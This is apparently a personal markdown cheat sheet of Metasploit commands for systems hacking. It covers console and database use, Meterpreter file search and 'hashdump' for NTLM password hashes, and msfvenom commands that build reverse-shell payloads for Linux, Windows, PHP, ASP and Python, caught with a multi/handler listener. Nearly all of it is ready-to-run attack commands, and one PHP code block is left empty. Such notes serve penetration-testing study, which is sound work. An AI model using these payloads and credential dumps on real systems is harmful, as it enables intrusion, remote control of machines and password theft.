# Notes on systems hacking

## Metasploit

#### Basic usage:

```bash
# launch metasploit framework console
$ msfconsole

# search modules
msf6> search <keyword>

# select a module from the search results
msf6> use <number>

# nmap can be run inside msfconsole
msf6> nmap -sV <IP> -n

# set global parameters
msf6> setg rhosts <ip_addr || list_of_IPs.txt>

# show available payloads for the selected exploit
msf6> show payloads
# set payload from the list
msf6> set payload <number>

# run the selected exploit, scanner, etc.
msf6(module_name)> exploit
msf6(module_name)> run

# list opened sessions
msf6> sessions
# attach to a session
msf6> sessions <number>
```

#### Metasploit database management:

```bash
$ systemctl start postgresql

# initialize the Metasploit Database as postgres (non-root user)
$ sudo -u postgres msfdb init

# delete the database
$ sudo -u postgres msfdb delete

# database status
msf6> db_status

# list  available workspaces
msf6> workspace

# add workspace (-d to delete)
msf6> workspace -a <workspace_name>

# switch to workspace
msf6> worspace <workspace_name>

# store nmap scans in the db
msf6> db_nmap -sV -p- <ip_addr>

# see hosts & services running on target systems (from db)
msf6> hosts
msf6> services

# set RHOSTS from db (all saved hosts)
msf6> hosts -R
```

----------------------------------------------------------------

## Meterpreter

```bash
# search for a file in the target filesystem
meterpreter> search -f <filename>

# get NTLM password hashes
meterpreter> hashdump
```

----------------------------------------------------------------

## Msfvenom

Generate payloads in many different formats (PHP, exe, dll, elf, etc.) for many different target systems. All payloads available in the Metasploit framework.

```bash
# list available payloads
$ msfvenom -l payloads
# list formats
$ msfvenom -l formats

# encode php meterpreter payload into base64
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip-addr> -f raw -e php/base64
```

### Generating reverse payloads based on target system's configuration

```bash
# Linux (elf)
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f elf > reverse_shell.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f exe > rev_shell.exe

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f raw > rev_shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_addr> LPORT=<port_number> -f asp > rev_shell.asp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<ip_addr> LPORT=<port_number> -f raw > rev_shell.py
```

### Catching a reverse shell

```bash
# generate reverse shell payload
# the starting php tag is commented out and the end tag is missing in the generated file.
# the file must be modified to convert it into a working PHP file  
msfvenom -p php/reverse_php LHOST=<ip_addr> LPORT=7777 -f raw > reverse_shell.php
```

```php
<?php

?>
```

```bash
msf6> use exploit/multi/handler
msf6> set LPORT 7777

# run the handler in the background to be able to attach to the session later
msf6> run -z

```